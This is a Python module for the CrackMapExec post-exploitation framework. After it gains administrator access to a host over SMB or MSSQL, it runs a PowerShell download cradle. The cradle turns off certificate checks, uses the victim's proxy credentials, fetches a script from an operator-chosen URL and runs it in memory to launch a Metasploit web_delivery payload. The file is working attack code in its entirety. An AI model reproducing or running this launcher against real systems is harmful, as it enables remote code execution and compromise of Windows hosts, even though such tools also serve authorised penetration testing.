#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from sys import exit


class CMEModule:
    """
    Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module
    Reference: https://github.com/EmpireProject/Empire/blob/2.0_beta/data/module_source/code_execution/Invoke-MetasploitPayload.ps1

    Module by @byt3bl33d3r
    """

    name = "web_delivery"
    description = "Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module"
    supported_protocols = ["smb", "mssql"]
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        """
        URL  URL for the download cradle
        PAYLOAD  Payload architecture (choices: 64 or 32) Default: 64
        """

        if not "URL" in module_options:
            context.log.fail("URL option is required!")
            exit(1)

        self.url = module_options["URL"]

        self.payload = "64"
        if "PAYLOAD" in module_options:
            if module_options["PAYLOAD"] not in ["64", "32"]:
                context.log.fail("Invalid value for PAYLOAD option!")
                exit(1)
            self.payload = module_options["PAYLOAD"]

    def on_admin_login(self, context, connection):
        ps_command = """[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};$client = New-Object Net.WebClient;$client.Proxy=[Net.WebRequest]::GetSystemWebProxy();$client.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;Invoke-Expression $client.downloadstring('{}');""".format(self.url)
        if self.payload == "32":
            connection.ps_execute(ps_command, force_ps32=True)
        else:
            connection.ps_execute(ps_command, force_ps32=False)
        context.log.success("Executed web-delivery launcher")
